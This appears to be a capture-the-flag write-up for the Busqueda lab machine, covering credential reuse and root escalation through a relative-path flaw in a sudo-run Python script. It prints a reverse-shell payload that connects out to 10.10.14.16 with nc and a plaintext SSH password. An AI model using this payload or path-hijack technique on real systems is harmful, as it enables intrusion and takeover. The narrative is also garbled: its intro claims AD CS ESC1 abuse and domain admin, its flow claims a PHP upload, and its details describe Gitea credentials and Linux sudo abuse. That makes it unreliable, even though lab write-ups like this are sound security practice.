Busqueda mimics a medium-sized enterprise environment with Active Directory Certificate Services (AD CS) misconfigurations.

Initial access was gained through SMB enumeration and credential reuse on a user with low privileges.

Escalated to root by leveraging a relative path vulnerability in `system-checkup`, which I executed with sudo from a controlled directory containing a malicious `full-checkup.sh`.

By identifying misissued certificates and leveraging ESC1 (template misconfiguration), I obtained a valid cert for authentication as a domain admin.

## Why I Chose This Machine

I picked Busqueda because it focuses on common scripting flaws that often go unnoticed during manual reviews — especially around relative path usage.

It also provides a realistic escalation vector where file placement and environment control become more important than direct exploitation.

## Attack Flow Overview

1. Discovered a password-protected admin panel and brute-forced the credentials  
2. Uploaded a PHP reverse shell via the panel to gain a foothold  
3. Found that the user could run a `system-checkup` script with sudo privileges  
4. Noticed that the script called `full-checkup.sh` using a relative path  
5. Executed `system-checkup` from a custom directory containing a malicious `full-checkup.sh` and gained root

This box demonstrates how minor implementation decisions — like using relative paths in privileged scripts — can lead to full system compromise.

ssh as `svc :jh1usoih2bkjaspwe92 `

## Privilege Escalation

>- `/var/www` contains `.git`
	- `config` file contains cody user credentials for `gitea.searcher.htb`
		- add the new domain to `/etc/hosts`
		- sign in with the obtained credentials 
- SSH as `svc` user with cody user's passsword.
	- `sudo -l` svc user has sudo privileges to run some python scripts
	- Following the official documentation for command formats, I was able to obtain more credentials.
	- Path abuse one of the python scripts. 
		- create a new file with reverse shell payload in another directory `/tmp`.
		- name it the same 
		- execute the file in the `tmp` using `sudo`.

To exploit the fact that `system-checkup` references `full-checkup.sh` via a relative path, I executed it from a controlled directory containing my own malicious `full-checkup.sh` script.  

This approach abuses path resolution behavior in shell scripts, allowing me to inject arbitrary code without modifying the original script — a tactic often overlooked in local privilege escalation assessments.

```sh
# create a shell file and insert a reverse shell payload into it
echo -en "#! /bin/bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.16 9001 >/tmp/f" > /tmp/full-checkup.sh

# make it executable
chmod +x /tmp/full-checkup.sh

# execute the shell
cd /tmp
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

## Alternative Paths Explored

I initially attempted to escalate using SUID binaries and writable service configs but found no exploitable paths.  
File uploads were limited by extension filtering, which I bypassed using PHP filename tricks.  
The real breakthrough came after inspecting the script logic and identifying path-based injection opportunities.

## Blue Team Perspective

Busqueda highlights the risk of relying on unsanitized relative paths in root-level scripts.  
To mitigate:

- Always use absolute paths in scripts with elevated privileges  
- Audit all sudo-accessible scripts for uncontrolled file references  
- Consider hardening user PATH and execution contexts when using `sudo`
